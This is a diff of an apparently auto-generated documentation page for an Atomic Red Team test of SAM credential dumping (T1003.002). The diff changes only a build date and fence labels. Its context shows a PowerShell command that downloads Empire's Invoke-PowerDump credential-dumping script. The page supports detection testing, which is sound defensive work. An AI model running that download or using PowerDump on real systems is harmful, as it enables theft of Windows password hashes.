@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1003.002"
 attack_technique_name: "OS Credential Dumping: Security Account Manager"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "powershell"
 aliases:
   - "804f28fc-68fc-40da-b5a2-e9d0bce5c193"
@@ -43,13 +43,13 @@ PowerDump script must exist on disk at specified location
 
 ### Prerequisite Check
 
-```text
+```untitled
 if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\PowerDump.ps1") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```untitled
 New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
 Invoke-Webrequest -Uri "https://raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1" -UseBasicParsing -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PowerDump.ps1"
 ```
